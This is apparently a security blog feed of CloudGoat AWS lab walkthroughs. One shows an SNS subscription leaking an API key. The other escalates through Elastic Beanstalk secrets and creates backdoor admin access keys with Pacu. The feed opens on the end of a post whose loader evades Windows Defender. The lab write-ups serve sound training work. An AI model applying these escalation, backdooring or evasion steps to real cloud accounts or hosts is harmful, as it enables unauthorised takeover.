class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Shell_Loader/Nothing_was_found.png" alt="Nothing_was_found"></p><h3 id="Detection-Explanation"><a href="#Detection-Explanation" class="headerlink" title="Detection Explanation"></a>Detection Explanation</h3><ul><li>Detection Name: <code>C2_1a (T1095 mem/meter-b mem/meter-g)</code></li><li>MITRE Technique: T1095 — Non-Application Layer Protocol</li><li>Indicators:<ul><li><code>mem/meter-b</code> and <code>mem/meter-g</code> suggest in-memory artifacts linked to Meterpreter.</li><li>These are heuristics or behavioral indicators seen after payload execution — likely from:<ul><li>Command and control (C2) network communication patterns (e.g. reverse HTTPS).</li><li>Meterpreter staging or beaconing behavior.</li><li>Memory-resident code structures or recognizable strings (e.g., handler UUIDs, session checks).</li></ul></li></ul></li></ul><p><img src="/images/Shell_Loader/sophos_detection.png" alt="sophos_detection"></p><p>But now windows defender never flags the executable!</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Shells </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-SNS-Secrets</title>
      <link href="/2025/05/14/Cloudgoat-SNS-Secrets/"/>
      <url>/2025/05/14/Cloudgoat-SNS-Secrets/</url>
      
        <content type="html"><![CDATA[<h1 id="AWS-SNS-Privilege-Escalation-Walkthrough"><a href="#AWS-SNS-Privilege-Escalation-Walkthrough" class="headerlink" title="AWS SNS Privilege Escalation Walkthrough"></a>AWS SNS Privilege Escalation Walkthrough</h1><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>We begin with the following AWS credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sns_user_access_key_id = [REDACTED]</span><br><span class="line">sns_user_secret_access_key = [REDACTED]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile init</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAQ6VKGD5Y4HR5QXYBV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;065855168369&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::065855168369:user/cg-sns-user-cgidi78fhfoxxa&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SNS-Enumeration"><a href="#SNS-Enumeration" class="headerlink" title="SNS Enumeration"></a>SNS Enumeration</h2><p>Based on the IAM username, we can infer that this account likely has access to SNS services. Let’s use Pacu to enumerate SNS resources:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pacu (init:imported-init) &gt; run sns_enum</span><br><span class="line">Module not found. Is it spelled correctly? Try using the module search function.</span><br><span class="line">Pacu (init:imported-init) &gt; run sns__enum</span><br></pre></td></tr></table></figure><p><img src="/images/Sns_Secrets/found_sns.png" alt="Topics"></p><p>We discovered one SNS topic. Let’s retrieve the specific details for this topic:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data SNS</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sns&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;us-east-1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;arn:aws:sns:us-east-1:065855168369:public-topic-cgidi78fhfoxxa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Owner&quot;</span><span class="punctuation">:</span> <span class="string">&quot;065855168369&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SubscriptionsConfirmed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SubscriptionsPending&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Exploiting-SNS-Topic-Access"><a href="#Exploiting-SNS-Topic-Access" class="headerlink" title="Exploiting SNS Topic Access"></a>Exploiting SNS Topic Access</h2><p>If our IAM user has the <code>sns:GetTopicAttributes</code> permission for the target SNS topic, we can subscribe to it to gain more information. Let’s run:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run sns__subscribe --topics arn:aws:sns:us-east-1:065855168369:public-topic-cgidi78fhfoxxa --email yourMAIL@gmail.com</span><br></pre></td></tr></table></figure><p>This will trigger a subscription confirmation email.<br><img src="/images/Sns_Secrets/sub_sns.png" alt="EmailCpnf"></p><p><img src="/images/Sns_Secrets/sns_mail.png" alt="Mail"></p><p><img src="/images/Sns_Secrets/sns_activation.png" alt="SNS_ACTV"><br>Approximately one minute after confirming the subscription, we receive an email containing an API Gateway key.<br><img src="/images/Sns_Secrets/api_key.png" alt="API"></p><h2 id="API-Gateway-Enumeration"><a href="#API-Gateway-Enumeration" class="headerlink" title="API Gateway Enumeration"></a>API Gateway Enumeration</h2><p>First, let’s identify the API Gateway that will accept our newly acquired API key:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8iisigub4b&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-api-cgidi78fhfoxxa&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;API for demonstrating leaked API key scenario&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;createdDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-14T12:38:25+03:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;apiKeySource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HEADER&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;endpointConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;EDGE&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ipAddressType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ipv4&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Scenario&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iam_privesc_by_key_rotation&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CloudGoat&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;disableExecuteApiEndpoint&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;rootResourceId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9ehi5vsa3m&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Finding-the-Stage-Name"><a href="#Finding-the-Stage-Name" class="headerlink" title="Finding the Stage Name"></a>Finding the Stage Name</h3><p>We need to identify the deployed stages:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;item&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;deploymentId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;62jn11&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;stageName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod-cgidi78fhfoxxa&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;cacheClusterEnabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;cacheClusterStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NOT_AVAILABLE&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;methodSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;variables&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tracingEnabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;createdDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-14T12:38:27+03:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lastUpdatedDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-14T12:38:27+03:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Identifying-Available-Resource-Paths"><a href="#Identifying-Available-Resource-Paths" class="headerlink" title="Identifying Available Resource Paths"></a>Identifying Available Resource Paths</h3><p>Let’s enumerate the available API endpoints:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9ehi5vsa3m&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jl35fp&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;parentId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9ehi5vsa3m&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;pathPart&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user-data&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/user-data&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;resourceMethods&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;GET&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Accessing-Sensitive-Data"><a href="#Accessing-Sensitive-Data" class="headerlink" title="Accessing Sensitive Data"></a>Accessing Sensitive Data</h2><p>Now we can construct our request using the API key to access the <code>/user-data</code> endpoint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET   -H <span class="string">&quot;x-api-key: [REDACTED]&quot;</span>   https://8iisigub4b.execute-api.us-east-1.amazonaws.com/prod-cgidi78fhfoxxa/user-data</span><br></pre></td></tr></table></figure><p>Success! We retrieved the flag and administrative credentials:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;final_flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;FLAG&#123;SNS_S3cr3ts_ar3_FUN&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Access granted&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1337&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SuperAdmin&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-Beanstalk</title>
      <link href="/2025/05/13/Cloudgoat-Beanstalk/"/>
      <url>/2025/05/13/Cloudgoat-Beanstalk/</url>
      
        <content type="html"><![CDATA[<h1 id="AWS-Beanstalk-Secrets-CTF-Walkthrough"><a href="#AWS-Beanstalk-Secrets-CTF-Walkthrough" class="headerlink" title="AWS Beanstalk Secrets CTF Walkthrough"></a>AWS Beanstalk Secrets CTF Walkthrough</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>In this capstone challenge, I tackled the Beanstalk Secrets scenario on GitHub. This scenario was based on a real AWS penetration test and presented an excellent opportunity to practice cloud security skills.</p><p>One interesting aspect of this challenge was that it required research on the AWS Elastic Beanstalk service, which wasn’t explicitly covered in previous training materials. This reflects real-world penetration testing, where you often need to research and enumerate unfamiliar services.</p><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>I was hired as an AWS Penetration Tester for Hack Smarter. The company uses Elastic Beanstalk to host some of their public-facing web applications. I was provided with a low-level account that has access to Elastic Beanstalk.</p><h2 id="Mission-Objectives"><a href="#Mission-Objectives" class="headerlink" title="Mission Objectives:"></a>Mission Objectives:</h2><ol><li>Research Elastic Beanstalk and identify common misconfigurations</li><li>Leverage findings to escalate privileges to admin access</li></ol><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>First, I configured AWS CLI with the provided low-privilege credentials and began basic enumeration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile init</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAQ6VKGD5Y7SP3O3ECX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;065855168369&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::065855168369:user/cgidmws70jym0c_low_priv_user&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I attempted to gather more information about the user but faced permission restrictions:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-user --profile init</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the GetUser operation: User: arn:aws:iam::065855168369:user/cgidmws70jym0c_low_priv_user is not authorized to perform: iam:GetUser on resource: user cgidmws70jym0c_low_priv_user because no identity-based policy allows the iam:GetUser action</span><br></pre></td></tr></table></figure><h2 id="Permission-Exploration"><a href="#Permission-Exploration" class="headerlink" title="Permission Exploration"></a>Permission Exploration</h2><p>I tried to determine what policies were attached to the user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-attached-user-policies --user-name cgidmws70jym0c_low_priv_user --profile init</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::065855168369:user/cgidmws70jym0c_low_priv_user is not authorized to perform: iam:ListAttachedUserPolicies on resource: user cgidmws70jym0c_low_priv_user because no identity-based policy allows the iam:ListAttachedUserPolicies action</span><br></pre></td></tr></table></figure><p>Group membership was also restricted:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-groups-for-user --user-name gidmws70jym0c_low_priv_user --profile init</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListGroupsForUser operation: User: arn:aws:iam::065855168369:user/cgidmws70jym0c_low_priv_user is not authorized to perform: iam:ListGroupsForUser on resource: user gidmws70jym0c_low_priv_user because no identity-based policy allows the iam:ListGroupsForUser action</span><br></pre></td></tr></table></figure><p>Role listing was blocked as well:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-roles --profile init</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListRoles operation: User: arn:aws:iam::065855168369:user/cgidmws70jym0c_low_priv_user is not authorized to perform: iam:ListRoles on resource: arn:aws:iam::065855168369:role/ because no identity-based policy allows the iam:ListRoles action</span><br></pre></td></tr></table></figure><h2 id="Leveraging-Pacu-for-AWS-Enumeration"><a href="#Leveraging-Pacu-for-AWS-Enumeration" class="headerlink" title="Leveraging Pacu for AWS Enumeration"></a>Leveraging Pacu for AWS Enumeration</h2><p>Since manual enumeration was hitting roadblocks, I turned to Pacu, an AWS exploitation framework. First, I tried exploring DynamoDB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Pacu (init:imported-init) &gt; run dynamodb__enum --regions eu-west-1</span><br><span class="line">  Running module dynamodb__enum...</span><br><span class="line">[dynamodb__enum] Starting region eu-west-1...</span><br><span class="line">[dynamodb__enum]   FAILURE:</span><br><span class="line">[dynamodb__enum]     MISSING NEEDED PERMISSIONS</span><br><span class="line">dynamodb__enum completed.</span><br><span class="line"></span><br><span class="line">[dynamodb__enum] MODULE SUMMARY:</span><br><span class="line"></span><br><span class="line">  No tables found</span><br></pre></td></tr></table></figure><h2 id="Discovering-Secrets-in-Elastic-Beanstalk"><a href="#Discovering-Secrets-in-Elastic-Beanstalk" class="headerlink" title="Discovering Secrets in Elastic Beanstalk"></a>Discovering Secrets in Elastic Beanstalk</h2><p>Given the scenario hint about Elastic Beanstalk, I focused on enumerating that service using Pacu:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Pacu (init:imported-init) &gt; run elasticbeanstalk__enum</span><br><span class="line">[elasticbeanstalk__enum]   No environments found in me-south-1.</span><br><span class="line">[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...</span><br><span class="line">[elasticbeanstalk__enum]   1 application(s) found in us-east-1.</span><br><span class="line">[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.</span><br><span class="line">    Potential secret in environment variable: SSHSourceRestriction =&gt; tcp,22,22,0.0.0.0/0</span><br><span class="line">    Potential secret in environment variable: EnvironmentVariables =&gt; SECONDARY_SECRET_KEY=[REDACTED],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=[REDACTED]</span><br><span class="line">    Potential secret in environment variable: SECONDARY_ACCESS_KEY =&gt; [REDACTED]</span><br></pre></td></tr></table></figure><p>This was the key finding! The Elastic Beanstalk environment contained environment variables with secondary AWS credentials. This is a common misconfiguration where secrets are stored in plaintext environment variables.</p><h2 id="Privilege-Escalation-First-Step"><a href="#Privilege-Escalation-First-Step" class="headerlink" title="Privilege Escalation: First Step"></a>Privilege Escalation: First Step</h2><p>Using the discovered secondary credentials, I configured a new AWS CLI profile and verified the identity:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile sec</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAQ6VKGD5Y2X6JF5I43&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;065855168369&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::065855168369:user/cgidmws70jym0c_secondary_user&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I gathered more information about this secondary user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-user --profile sec</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;User&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Path&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;cgidmws70jym0c_secondary_user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAQ6VKGD5Y2X6JF5I43&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::065855168369:user/cgidmws70jym0c_secondary_user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2025-05-13T16:09:17+00:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Tags&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Key&quot;</span>: <span class="string">&quot;Stack&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Value&quot;</span>: <span class="string">&quot;CloudGoat&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Key&quot;</span>: <span class="string">&quot;Scenario&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Value&quot;</span>: <span class="string">&quot;beanstalk_secrets&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-Final-Escalation"><a href="#The-Final-Escalation" class="headerlink" title="The Final Escalation"></a>The Final Escalation</h2><p>I ran Pacu’s privilege escalation scanner to identify potential paths to admin access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sec:imported-sec) &gt; run iam__privesc_scan</span><br><span class="line"></span><br><span class="line">The scan revealed that the secondary user had the `iam:CreateAccessKey` permission for the admin user! This is a critical permission that allows creating new access keys for other users.</span><br><span class="line"></span><br><span class="line">[iam__privesc_scan]   Running module iam__backdoor_users_keys...</span><br><span class="line">[iam__backdoor_users_keys] Backdoor the following users?</span><br><span class="line">[iam__backdoor_users_keys]   cgidmws70jym0c_admin_user</span><br><span class="line">[iam__backdoor_users_keys]     Access Key ID: [REDACTED]</span><br><span class="line">[iam__backdoor_users_keys]     Secret Key: [REDACTED]</span><br><span class="line">[iam__backdoor_users_keys] iam__backdoor_users_keys completed.</span><br></pre></td></tr></table></figure><p>I now had admin credentials and verified the identity:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile admin</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAQ6VKGD5YRF3EP5QKA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;065855168369&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::065855168369:user/cgidmws70jym0c_admin_user&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Capturing-the-Flag"><a href="#Capturing-the-Flag" class="headerlink" title="Capturing the Flag"></a>Capturing the Flag</h2><p>With admin access, I could now enumerate AWS Secrets Manager to find the flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pacu (admin:imported-admin) &gt; run secrets__enum --region us-east-1</span><br><span class="line">  Running module secrets__enum...</span><br><span class="line">[secrets__enum] Starting region us-east-1...</span><br><span class="line">[secrets__enum]  Found secret: cgidmws70jym0c_final_flag</span><br><span class="line">[secrets__enum] Probing Secret: 